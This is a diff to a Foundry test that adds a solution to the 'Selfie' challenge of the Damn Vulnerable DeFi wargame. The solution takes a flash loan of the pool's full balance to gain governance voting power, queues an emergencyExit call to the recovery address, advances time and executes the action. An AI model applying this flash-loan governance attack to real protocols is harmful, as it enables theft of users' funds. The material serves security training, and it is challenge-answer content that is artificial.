@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {FlashLoanReceiver} from "../../src/selfie/FlashLoanReceiver.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        FlashLoanReceiver reciever = new FlashLoanReceiver(pool, token, governance);
+        bytes memory EmergencyExitCallData = abi.encodeWithSignature(
+            "emergencyExit(address)", 
+            recovery
+        );    
+        pool.flashLoan(reciever, address(token), TOKENS_IN_POOL, EmergencyExitCallData);
+
+        vm.warp(block.timestamp + 3 days);
+        governance.executeAction(1); 
     }
 
     /**
